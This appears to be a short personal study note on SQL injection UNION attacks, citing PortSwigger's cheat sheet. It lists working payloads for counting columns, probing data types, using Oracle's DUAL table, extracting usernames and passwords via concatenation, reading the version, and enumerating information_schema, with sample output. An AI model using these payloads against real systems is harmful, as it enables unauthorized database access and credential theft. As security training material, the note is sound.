For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.
## detect how many columns
### m1:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
```
### m2:
```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--
```
https://portswigger.net/web-security/sql-injection/cheat-sheet
___
- On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:
- `' UNION SELECT NULL FROM DUAL--`

- use `' UNION SELECT NULL,'a',NULL--` to get data type
___
## Retrive multiple values in the same column
`' UNION SELECT username || '~' || password FROM users--` => (oracle concatenation)
## Retrive version
`' UNION SELECT @@version--`
___
`SELECT * FROM information_schema.tables`

This returns output like the following:

```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== 
MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE
MyDatabase dbo Feedback BASE TABLE
```

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:

```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= 
MyDatabase dbo Users UserId int 
MyDatabase dbo Users Username varchar 
MyDatabase dbo Users Password varchar
```
